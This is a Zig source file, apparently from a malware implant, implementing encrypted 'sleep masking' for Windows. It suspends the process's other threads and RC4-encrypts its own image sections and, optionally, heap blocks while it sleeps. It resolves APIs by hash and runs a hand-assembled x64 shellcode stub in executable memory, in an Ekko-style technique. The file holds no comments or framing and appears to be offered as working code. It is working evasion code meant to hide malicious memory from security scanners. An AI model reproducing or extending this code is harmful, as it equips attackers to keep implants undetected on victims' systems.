const std = @import("std");
const api = @import("api.zig");
const obf = @import("obf.zig");
const windows = std.os.windows;
const win = @import("win32.zig");

pub var nx_module_base: ?win.HMODULE = null;

const NxSection = struct {
    address: [*]u8,
    size: usize,
    old_protect: win.DWORD,
};

fn nx_u16(data: []const u8, offset: usize) ?u16 {
    if (offset + 2 > data.len) return null;
    return std.mem.readInt(u16, data[offset..][0..2], .little);
}

fn nx_u32(data: []const u8, offset: usize) ?u32 {
    if (offset + 4 > data.len) return null;
    return std.mem.readInt(u32, data[offset..][0..4], .little);
}

fn nx_rc4(key: []const u8, data: []u8) void {
    if (key.len == 0) return;
    var state: [256]u8 = undefined;
    var index: usize = 0;
    while (index < 256) : (index += 1) state[index] = @intCast(index);
    var j: u8 = 0;
    index = 0;
    while (index < 256) : (index += 1) {
        j +%= state[index] +% key[index % key.len];
        const tmp = state[index];
        state[index] = state[j];
        state[j] = tmp;
    }
    var i: u8 = 0;
    j = 0;
    for (data) |*byte| {
        i +%= 1;
        j +%= state[i];
        const tmp = state[i];
        state[i] = state[j];
        state[j] = tmp;
        byte.* ^= state[state[i] +% state[j]];
    }
}

const NxSuspended = struct {
    handle: win.HANDLE,
    count: u32,
};

fn nx_suspend_threads(handles: *[64]?NxSuspended, skip_tid: u32) usize {
    const snapshot = win.CreateToolhelp32Snapshot(win.TH32CS_SNAPTHREAD, win.GetCurrentProcessId());
    if (snapshot == win.INVALID_HANDLE_VALUE) return 0;
    defer _ = win.CloseHandle(snapshot);
    var entry: win.THREADENTRY32 = std.mem.zeroes(win.THREADENTRY32);
    entry.dwSize = @sizeOf(win.THREADENTRY32);
    const current = win.GetCurrentThreadId();
    var count: usize = 0;
    if (!win.Thread32First(snapshot, &entry).toBool()) return 0;
    while (true) {
        if (entry.th32OwnerProcessID == win.GetCurrentProcessId() and
            entry.th32ThreadID != current and entry.th32ThreadID != skip_tid and
            count < handles.len)
        {
            const thread = win.OpenThread(0x0002, win.BOOL.FALSE, entry.th32ThreadID);
            if (thread) |handle| {
                const previous = win.SuspendThread(handle);
                if (previous != 0xFFFFFFFF) {
                    handles[count] = .{ .handle = handle, .count = previous + 1 };
                    count += 1;
                } else {
                    _ = win.CloseHandle(handle);
                }
            }
        }
        if (!win.Thread32Next(snapshot, &entry).toBool()) break;
    }
    return count;
}

fn nx_resume_threads(handles: *[64]?NxSuspended, count: usize) void {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        if (handles[index]) |entry| {
            var resume_count: u32 = 0;
            while (resume_count < entry.count) : (resume_count += 1)
                _ = win.ResumeThread(entry.handle);
            _ = win.CloseHandle(entry.handle);
            handles[index] = null;
        }
    }
}

fn nx_section_protection(characteristics: u32) win.DWORD {
    if ((characteristics & 0x20000000) != 0) {
        if ((characteristics & 0x80000000) != 0) return win.PAGE_EXECUTE_READWRITE;
        if ((characteristics & 0x40000000) != 0) return win.PAGE_EXECUTE_READ;
        return win.PAGE_EXECUTE;
    }
    if ((characteristics & 0x80000000) != 0) return win.PAGE_READWRITE;
    if ((characteristics & 0x40000000) != 0) return win.PAGE_READONLY;
    return win.PAGE_NOACCESS;
}

fn nx_collect_sections(sections: *[32]NxSection, include_text: bool) usize {
    const image = nx_module_base orelse windows.peb().ImageBaseAddress;
    if (@intFromPtr(image) == 0) return 0;
    const base: [*]u8 = @ptrFromInt(@intFromPtr(image));
    const header = base[0..0x1000];
    const lfanew = nx_u32(header, 0x3C) orelse return 0;
    const nt = @as(usize, lfanew);
    const count = nx_u16(header, nt + 6) orelse return 0;
    const optional_size = nx_u16(header, nt + 20) orelse return 0;
    const section_table = nt + 24 + @as(usize, optional_size);
    if (section_table > header.len) return 0;
    var found: usize = 0;
    var index: usize = 0;
    while (index < count and found < sections.len) : (index += 1) {
        const offset = section_table + index * 40;
        if (offset + 40 > header.len) break;
        const name = header[offset .. offset + 8];
        const virtual_size = nx_u32(header, offset + 8) orelse 0;
        const virtual_address = nx_u32(header, offset + 12) orelse 0;
        const characteristics = nx_u32(header, offset + 36) orelse 0;
        const is_text = std.mem.startsWith(u8, name, ".text");
        const is_data = std.mem.startsWith(u8, name, ".data") or
            std.mem.startsWith(u8, name, ".rdata") or
            std.mem.startsWith(u8, name, ".bss");
        if (!is_data and !(include_text and is_text)) continue;
        if ((characteristics & 0x00000008) != 0) continue; // discardable
        const raw_size = nx_u32(header, offset + 16) orelse 0;
        const size = @max(@as(usize, virtual_size), @as(usize, raw_size));
        if (size == 0) continue;
        sections[found] = .{
            .address = base + virtual_address,
            .size = size,
            .old_protect = nx_section_protection(characteristics),
        };
        found += 1;
    }
    return found;
}

fn nx_protect_sections(sections: *[32]NxSection, count: usize) bool {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        if (!win.VirtualProtect(
            sections[index].address,
            sections[index].size,
            win.PAGE_READWRITE,
            &sections[index].old_protect,
        ).toBool()) return false;
    }
    return true;
}

fn nx_restore_sections(sections: *[32]NxSection, count: usize) void {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        var ignored: win.DWORD = 0;
        _ = win.VirtualProtect(
            sections[index].address,
            sections[index].size,
            sections[index].old_protect,
            &ignored,
        );
    }
}

fn nx_rc4_sections(sections: *[32]NxSection, count: usize, key: []const u8) void {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const slice = sections[index].address[0..sections[index].size];
        nx_rc4(key, slice);
    }
}

const NxSystemFunction = *const fn (?*anyopaque, u32, u32) callconv(.winapi) i32;
const NxSleepFunction = *const fn (u32) callconv(.winapi) void;

fn nx_resolve_sleep() ?NxSleepFunction {
    const pointer = api.nx_api(0xFAB06795, 0xD488CE48) orelse return null;
    return @ptrCast(@alignCast(pointer));
}

fn nx_resolve_system_function(function_hash: u32) ?NxSystemFunction {
    const pointer = api.nx_api(0x7B933969, function_hash) orelse return null;
    return @ptrCast(@alignCast(pointer));
}

fn nx_rtl_apply(sections: *[32]NxSection, count: usize, function: NxSystemFunction) bool {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const size = sections[index].size & ~@as(usize, 7);
        if (size == 0) continue;
        if (function(sections[index].address, @intCast(size), 0) < 0) return false;
    }
    return true;
}

const NxEkkoSection = extern struct {
    address: usize,
    size: usize,
    old_protect: u32,
    padding: u32,
};

const NxEkkoContext = extern struct {
    wait_for_single: usize,
    go_event: win.HANDLE,
    virtual_protect: usize,
    image_base: usize,
    image_size: usize,
    key_ptr: usize,
    state_ptr: usize,
    unused_pointer: usize,
    sleep_function: usize,
    sleep_ms: u64,
    set_event: usize,
    done_event: win.HANDLE,
    section_table: usize,
    section_count: usize,
    scratch: u32,
    padding: u32,
};

const NX_EKKO_STUB = [_]u8{
    0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x89, 0xCB,
    0x48, 0x8B, 0x4B, 0x08, 0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x13, 0x48, 0x8B, 0x4B,
    0x18, 0x48, 0x8B, 0x53, 0x20, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x20,
    0xFF, 0x53, 0x10, 0x48, 0x8B, 0x4B, 0x18, 0x48, 0x8B, 0x53, 0x20, 0x4C, 0x8B, 0x43, 0x28, 0x4C,
    0x8B, 0x4B, 0x30, 0xE8, 0x64, 0x00, 0x00, 0x00, 0x8B, 0x4B, 0x48, 0xFF, 0x53, 0x40, 0x48, 0x8B,
    0x4B, 0x18, 0x48, 0x8B, 0x53, 0x20, 0x4C, 0x8B, 0x43, 0x28, 0x4C, 0x8B, 0x4B, 0x30, 0xE8, 0x49,
    0x00, 0x00, 0x00, 0x4C, 0x8B, 0x63, 0x60, 0x4C, 0x8B, 0x6B, 0x68, 0x45, 0x31, 0xF6, 0x4D, 0x39,
    0xEE, 0x73, 0x22, 0x4C, 0x89, 0xF0, 0x48, 0x6B, 0xC0, 0x18, 0x4C, 0x01, 0xE0, 0x48, 0x8B, 0x08,
    0x48, 0x8B, 0x50, 0x08, 0x44, 0x8B, 0x40, 0x10, 0x4C, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x53, 0x10,
    0x49, 0xFF, 0xC6, 0xEB, 0xD9, 0x48, 0x8B, 0x4B, 0x58, 0xFF, 0x53, 0x50, 0x31, 0xC0, 0x48, 0x83,
    0xC4, 0x30, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5B, 0xC3, 0x49, 0x89, 0xCC, 0x49,
    0x89, 0xD5, 0x4D, 0x89, 0xC6, 0x4D, 0x89, 0xCF, 0x31, 0xC0, 0x41, 0x88, 0x04, 0x07, 0xFE, 0xC0,
    0x75, 0xF8, 0x45, 0x31, 0xD2, 0x45, 0x31, 0xDB, 0x43, 0x0F, 0xB6, 0x04, 0x17, 0x41, 0x00, 0xC3,
    0x44, 0x89, 0xD1, 0x83, 0xE1, 0x1F, 0x41, 0x0F, 0xB6, 0x0C, 0x0E, 0x41, 0x00, 0xCB, 0x43, 0x8A,
    0x04, 0x17, 0x43, 0x8A, 0x14, 0x1F, 0x43, 0x88, 0x14, 0x17, 0x43, 0x88, 0x04, 0x1F, 0x41, 0xFE,
    0xC2, 0x75, 0xD5, 0x45, 0x31, 0xD2, 0x45, 0x31, 0xDB, 0x4D, 0x85, 0xED, 0x74, 0x3C, 0x41, 0xFE,
    0xC2, 0x43, 0x0F, 0xB6, 0x04, 0x17, 0x41, 0x00, 0xC3, 0x43, 0x8A, 0x04, 0x17, 0x43, 0x8A, 0x14,
    0x1F, 0x43, 0x88, 0x14, 0x17, 0x43, 0x88, 0x04, 0x1F, 0x43, 0x0F, 0xB6, 0x04, 0x17, 0x43, 0x0F,
    0xB6, 0x14, 0x1F, 0x01, 0xD0, 0x25, 0xFF, 0x00, 0x00, 0x00, 0x41, 0x8A, 0x04, 0x07, 0x41, 0x30,
    0x04, 0x24, 0x49, 0xFF, 0xC4, 0x49, 0xFF, 0xCD, 0xEB, 0xBF, 0xC3,
};

const NxNtSignalAndWait = *const fn (win.HANDLE, win.HANDLE, win.BOOL, ?*i64) callconv(.winapi) i32;
const NxKernelFunction = *const fn () callconv(.winapi) void;

fn nx_resolve_export(module_hash: u32, function_hash: u32) ?usize {
    const pointer = api.nx_api(module_hash, function_hash) orelse return null;
    return @intFromPtr(pointer);
}

fn nx_image_info() ?struct { base: [*]u8, size: usize } {
    const image = nx_module_base orelse windows.peb().ImageBaseAddress;
    if (@intFromPtr(image) == 0) return null;
    const base: [*]u8 = @ptrFromInt(@intFromPtr(image));
    const header = base[0..0x1000];
    const lfanew = nx_u32(header, 0x3C) orelse return null;
    const nt = @as(usize, lfanew);
    const opt = nt + 24;
    const size = nx_u32(header, opt + 56) orelse return null;
    if (size == 0) return null;
    return .{ .base = base, .size = size };
}

const NxHeapBlock = extern struct {
    address: usize,
    size: u32,
    padding: u32,
};

fn nx_heap_encrypt(key: []const u8, table: [*]NxHeapBlock, capacity: usize) usize {
    const count = win.GetProcessHeaps(0, null);
    if (count == 0 or count > 64) return 0;
    var heaps: [64]win.HANDLE = undefined;
    const actual = win.GetProcessHeaps(64, &heaps);
    if (actual == 0) return 0;
    const default_heap = win.GetProcessHeap();
    var collected: usize = 0;
    var index: usize = 0;
    while (index < actual) : (index += 1) {
        if (default_heap != null and heaps[index] == default_heap.?) continue;
        var entry: win.PROCESS_HEAP_ENTRY = std.mem.zeroes(win.PROCESS_HEAP_ENTRY);
        while (win.HeapWalk(heaps[index], &entry).toBool()) {
            if ((entry.wFlags & 1) == 0) continue;
            const data = entry.lpData orelse continue;
            if (@intFromPtr(data) == @intFromPtr(heaps[index])) continue;
            if (entry.cbData == 0 or entry.cbData >= 0x100000) continue;
            const size = entry.cbData & ~@as(u32, 7);
            if (size == 0 or collected >= capacity) continue;
            table[collected] = .{
                .address = @intFromPtr(data),
                .size = size,
                .padding = 0,
            };
            collected += 1;
            const block_bytes: [*]u8 = @ptrCast(data);
            nx_rc4(key, block_bytes[0..size]);
        }
    }
    return collected;
}

fn nx_heap_decrypt(key: []const u8, table: [*]NxHeapBlock, count: usize) void {
    var index: usize = 0;
    while (index < count) : (index += 1) {
        const address: [*]u8 = @ptrFromInt(table[index].address);
        nx_rc4(key, address[0..table[index].size]);
    }
}

fn nx_ekko_full(ms: u32, heap_mode: bool) bool {
    const image = nx_image_info() orelse return false;
    var sections: [32]NxSection = @splat(.{
        .address = undefined,
        .size = 0,
        .old_protect = 0,
    });
    const section_count = nx_collect_sections(&sections, true);
    if (section_count == 0) return false;

    const wait_for_single = nx_resolve_export(0xFAB06795, 0x788F4E24) orelse return false;
    const virtual_protect = nx_resolve_export(0xFAB06795, 0xC04ED417) orelse return false;
    const sleep_function = nx_resolve_export(0xFAB06795, 0xD488CE48) orelse return false;
    const set_event = nx_resolve_export(0xFAB06795, 0x60CFBB9D) orelse return false;
    const nt_signal_pointer = nx_resolve_export(0xD432B36D, 0x739A92F7) orelse return false;
    const nt_signal: NxNtSignalAndWait = @ptrFromInt(nt_signal_pointer);

    const go_event = win.CreateEventW(null, win.BOOL.TRUE, win.BOOL.FALSE, null) orelse return false;
    const done_event = win.CreateEventW(null, win.BOOL.TRUE, win.BOOL.FALSE, null) orelse {
        _ = win.CloseHandle(go_event);
        return false;
    };
    defer _ = win.CloseHandle(go_event);
    defer _ = win.CloseHandle(done_event);

    const stub_offset: usize = 0;
    const context_offset = std.mem.alignForward(usize, stub_offset + NX_EKKO_STUB.len, 16);
    const key_offset = std.mem.alignForward(usize, context_offset + @sizeOf(NxEkkoContext), 16);
    const state_offset = std.mem.alignForward(usize, key_offset + 32, 16);
    const sections_offset = std.mem.alignForward(usize, state_offset + 256, 16);
    const heap_table_offset = std.mem.alignForward(usize, sections_offset + section_count * @sizeOf(NxEkkoSection), 16);
    const heap_capacity: usize = 8192;
    const total_size = std.mem.alignForward(
        usize,
        heap_table_offset + heap_capacity * @sizeOf(NxHeapBlock),
        16,
    );
    const block = win.VirtualAlloc(
        null,
        total_size,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_EXECUTE_READWRITE,
    ) orelse return false;
    var free_block = true;
    defer {
        if (free_block) _ = win.VirtualFree(block, 0, win.MEM_RELEASE);
    }

    const bytes: [*]u8 = @ptrCast(block);
    @memcpy(bytes[0..NX_EKKO_STUB.len], &NX_EKKO_STUB);
    const context: *NxEkkoContext = @ptrCast(@alignCast(bytes + context_offset));
    const remote_sections: [*]NxEkkoSection = @ptrCast(@alignCast(bytes + sections_offset));
    const key: [*]u8 = bytes + key_offset;
    win.nx_random_bytes(key[0..32]);
    const state: [*]u8 = bytes + state_offset;
    @memset(state[0..256], 0);
    const heap_table: [*]NxHeapBlock = @ptrCast(@alignCast(bytes + heap_table_offset));

    var index: usize = 0;
    while (index < section_count) : (index += 1) {
        remote_sections[index] = .{
            .address = @intFromPtr(sections[index].address),
            .size = sections[index].size,
            .old_protect = sections[index].old_protect,
            .padding = 0,
        };
    }

    context.* = .{
        .wait_for_single = wait_for_single,
        .go_event = go_event,
        .virtual_protect = virtual_protect,
        .image_base = @intFromPtr(image.base),
        .image_size = image.size,
        .key_ptr = @intFromPtr(key),
        .state_ptr = @intFromPtr(state),
        .unused_pointer = 0,
        .sleep_function = sleep_function,
        .sleep_ms = ms,
        .set_event = set_event,
        .done_event = done_event,
        .section_table = @intFromPtr(remote_sections),
        .section_count = section_count,
        .scratch = 0,
        .padding = 0,
    };

    var thread_id: win.DWORD = 0;
    const worker = win.CreateThread(
        null,
        0,
        @ptrCast(@alignCast(bytes)),
        context,
        0,
        &thread_id,
    ) orelse return false;
    defer _ = win.CloseHandle(worker);

    var suspended: [64]?NxSuspended = @splat(null);
    const suspended_count = nx_suspend_threads(&suspended, thread_id);
    defer nx_resume_threads(&suspended, suspended_count);
    var heap_blocks: usize = 0;
    if (heap_mode) {
        heap_blocks = nx_heap_encrypt(key[0..32], heap_table, heap_capacity);
    }

    const status = nt_signal(go_event, done_event, win.BOOL.FALSE, null);
    if (status < 0) {
        // The worker may still be blocked on the go event; do not free its
        // stub/context out from under it.
        if (heap_mode) nx_heap_decrypt(key[0..32], heap_table, heap_blocks);
        free_block = false;
        return false;
    }
    if (win.WaitForSingleObject(worker, 5000) != win.WAIT_OBJECT_0) {
        free_block = false;
        return true;
    }
    if (heap_mode) {
        nx_heap_decrypt(key[0..32], heap_table, heap_blocks);
    }
    return true;
}

fn nx_rtl_sleep(ms: u32) void {
    const sleep_function = nx_resolve_sleep() orelse {
        win.Sleep(ms);
        return;
    };
    const encrypt = nx_resolve_system_function(0x168B07EE);
    const decrypt = nx_resolve_system_function(0x168B07EF);
    if (encrypt == null or decrypt == null) {
        win.Sleep(ms);
        return;
    }
    var threads: [64]?NxSuspended = @splat(null);
    const thread_count = nx_suspend_threads(&threads, 0);
    defer nx_resume_threads(&threads, thread_count);
    var sections: [32]NxSection = @splat(.{
        .address = undefined,
        .size = 0,
        .old_protect = 0,
    });
    const count = nx_collect_sections(&sections, false);
    if (count == 0) {
        win.Sleep(ms);
        return;
    }
    if (!nx_protect_sections(&sections, count)) {
        win.Sleep(ms);
        return;
    }
    if (!nx_rtl_apply(&sections, count, encrypt.?)) {
        nx_restore_sections(&sections, count);
        win.Sleep(ms);
        return;
    }
    sleep_function(ms);
    _ = nx_rtl_apply(&sections, count, decrypt.?);
    nx_restore_sections(&sections, count);
}

pub fn nx_sleep(ms: u32, mask: []const u8) void {
    if (ms == 0) return;
    if (obf.eq(mask, "none") or mask.len == 0) {
        win.Sleep(ms);
        return;
    }
    if (obf.eq(mask, "rtl_data")) {
        nx_rtl_sleep(ms);
        return;
    }
    const heap_mode = obf.eq(mask, "ekko_heap");
    if (!nx_ekko_full(ms, heap_mode)) win.Sleep(ms);
}
